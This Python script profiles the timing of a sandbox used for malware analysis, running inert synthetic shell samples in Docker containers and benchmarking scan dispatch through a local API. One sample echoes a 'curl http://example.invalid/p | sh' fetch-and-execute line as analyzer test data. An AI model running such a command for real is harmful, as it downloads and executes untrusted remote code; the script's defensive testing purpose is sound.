"""SANDBox M6 - dynamic sandbox lifecycle profiler (diagnostic only).

Measures each lifecycle stage with monotonic timing WITHOUT touching production
code: it mirrors the EXACT container parameters of SandboxPolicy and times
create / start / wait / logs / remove separately, plus the in-container
self-reported duration_ms from the sandbox JSON payload.

Also runs a small worker-dispatch micro-benchmark through the real API to
quantify queue waiting (stage F).

No security parameter is relaxed; samples are inert synthetic scripts.
"""

import hashlib
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "backend"))

import httpx  # noqa: E402
from docker.types import Mount  # noqa: E402

from app.analyzers.sandbox.policy import SandboxPolicy  # noqa: E402
from app.analyzers.sandbox.runner import _json_loads_last  # noqa: E402
from app.core.config import settings  # noqa: E402

RESULTS = Path(__file__).resolve().parent / "results"
BASE = "http://127.0.0.1:8001"
N = 3

SAMPLES = {
    "A_simple": b"#!/bin/sh\necho hello\nexit 0\n",
    "B_child": b"#!/bin/sh\nsh -c 'echo hi'\nexit 0\n",
    "C_longcmd": b"#!/bin/sh\nsh -c \"echo curl http://example.invalid/p | sh\"\nexit 0\n",
}


def write_sample(data: bytes) -> tuple[str, Path]:
    sha = hashlib.sha256(data).hexdigest()
    path = settings.uploads_dir / f"{sha}.bin"
    if not path.exists():
        path.write_bytes(data)
    return sha, path


def timed_container(policy: SandboxPolicy, sample_sha: str, display: str, entrypoint=None, command=None) -> dict:
    import docker

    client = docker.from_env()
    name = f"profile-{int(time.time() * 1000) % 1000000}"
    kwargs = dict(
        image=policy.image,
        name=name,
        network_disabled=policy.network_disabled,
        mem_limit=policy.mem_limit,
        nano_cpus=policy.nano_cpus,
        pids_limit=policy.pids_limit,
        read_only=policy.read_only_rootfs,
        tmpfs=policy.tmpfs or None,
        cap_drop=list(policy.cap_drop) if policy.cap_drop else None,
        security_opt=list(policy.security_opt),
        user=policy.user,
        environment={"SANDBOX_EXEC_TIMEOUT_S": str(policy.exec_timeout_s), "SANDBOX_MAX_EVENTS": str(policy.max_events)},
        mounts=[Mount(policy.input_mount_container, policy.input_mount_host, type="bind", read_only=True)],
        detach=True,
    )
    if entrypoint is not None:
        kwargs["entrypoint"] = entrypoint
    if command is not None:
        kwargs["command"] = command
    else:
        kwargs["command"] = [policy.input_mount_container, f"{sample_sha}.bin", display]

    stages = {}
    t0 = time.perf_counter()
    container = client.containers.create(**kwargs)
    stages["create_s"] = round(time.perf_counter() - t0, 3)
    created_at = container.attrs.get("Created")

    t0 = time.perf_counter()
    container.start()
    stages["start_s"] = round(time.perf_counter() - t0, 3)
    started_at = container.attrs.get("State", {}).get("StartedAt")

    t0 = time.perf_counter()
    exit_info = container.wait(timeout=policy.timeout_s)
    stages["wait_s"] = round(time.perf_counter() - t0, 3)
    container.reload()
    finished_at = container.attrs.get("State", {}).get("FinishedAt")

    t0 = time.perf_counter()
    raw = container.logs(stdout=True, stderr=True).decode(errors="replace")
    stages["logs_s"] = round(time.perf_counter() - t0, 3)
    if len(raw) > policy.max_output_bytes:
        raw = raw[-policy.max_output_bytes :]
    payload = _json_loads_last(raw)

    t0 = time.perf_counter()
    container.remove(force=True)
    stages["remove_s"] = round(time.perf_counter() - t0, 3)

    stages["container_timestamps"] = {
        "created": created_at, "started": started_at, "finished": finished_at,
        "exit_code": exit_info.get("StatusCode"),
    }
    stages["sandbox_self_duration_ms"] = payload.get("duration_ms")
    stages["sandbox_status"] = payload.get("status")
    return stages


def mean(rows, key):
    return round(sum(r[key] for r in rows) / len(rows), 3) if rows else 0.0


def main():
    policy = SandboxPolicy.from_settings()
    import docker as _docker  # noqa: PLC0415

    _docker.from_env()  # fail fast if daemon down

    profile = {"policy": {
        "image": policy.image,
        "network_disabled": policy.network_disabled,
        "read_only_rootfs": policy.read_only_rootfs,
        "cap_drop": list(policy.cap_drop),
        "security_opt": list(policy.security_opt),
        "user": policy.user,
        "mem_limit": policy.mem_limit,
        "nano_cpus": policy.nano_cpus,
        "pids_limit": policy.pids_limit,
        "timeout_s": policy.timeout_s,
        "exec_timeout_s": policy.exec_timeout_s,
        "max_events": policy.max_events,
        "max_output_bytes": policy.max_output_bytes,
    }, "samples": {}}

    for key, data in SAMPLES.items():
        sha, path = write_sample(data)
        rows = [timed_container(policy, sha, f"{key}.sh") for _ in range(N)]
        profile["samples"][key] = {
            "create_s": mean(rows, "create_s"),
            "start_s": mean(rows, "start_s"),
            "wait_s": mean(rows, "wait_s"),
            "logs_s": mean(rows, "logs_s"),
            "remove_s": mean(rows, "remove_s"),
            "sandbox_self_duration_ms": mean(rows, "sandbox_self_duration_ms"),
            "status": rows[0]["sandbox_status"],
            "runs": rows,
        }
        print(f"{key}: create={mean(rows,'create_s')} start={mean(rows,'start_s')} wait={mean(rows,'wait_s')} "
              f"logs={mean(rows,'logs_s')} remove={mean(rows,'remove_s')} self_ms={mean(rows,'sandbox_self_duration_ms')}")

    # strace-vs-direct comparison (sample A only)
    sha, _ = write_sample(SAMPLES["A_simple"])
    direct_rows = [timed_container(policy, sha, "A.sh", entrypoint=["/bin/sh"], command=[f"{policy.input_mount_container}/{sha}.bin"]) for _ in range(N)]
    strace_wait = profile["samples"]["A_simple"]["wait_s"]
    direct_wait = mean(direct_rows, "wait_s")
    profile["strace_overhead_wait_delta_s"] = round(strace_wait - direct_wait, 3)
    print(f"strace overhead (wait delta, sample A): {round(strace_wait - direct_wait, 3)} s (strace={strace_wait} direct={direct_wait})")

    # worker-dispatch micro-benchmark through the real API (20 fast benign files)
    client = httpx.Client(base_url=BASE, timeout=120)
    jobs = []
    t0 = time.perf_counter()
    for i in range(20):
        r = client.post("/api/scans", files={"file": (f"prof_{i}.txt", f"profile dispatch sample {i}".encode(), "text/plain")})
        assert r.status_code == 202, r.text
        jobs.append((time.perf_counter(), r.json()["id"]))
    sub_dur = time.perf_counter() - t0
    done_times = []
    for submitted_at, sid in jobs:
        while True:
            d = client.get(f"/api/scans/{sid}").json()
            if d["status"] in ("completed", "failed"):
                done_times.append(time.perf_counter() - submitted_at)
                break
            time.sleep(0.25)
    done_times.sort()
    profile["dispatch_20_files"] = {
        "submission_s": round(sub_dur, 2),
        "first_done_s": round(done_times[0], 2),
        "last_done_s": round(done_times[-1], 2),
        "mean_s": round(sum(done_times) / len(done_times), 2),
        "median_s": round(done_times[len(done_times) // 2], 2),
        "files_per_second": round(20 / done_times[-1], 2),
    }
    print("dispatch20:", profile["dispatch_20_files"])

    (RESULTS / "sandbox_profile.json").write_text(json.dumps(profile, indent=2), encoding="utf-8")
    print("wrote results/sandbox_profile.json")


if __name__ == "__main__":
    main()
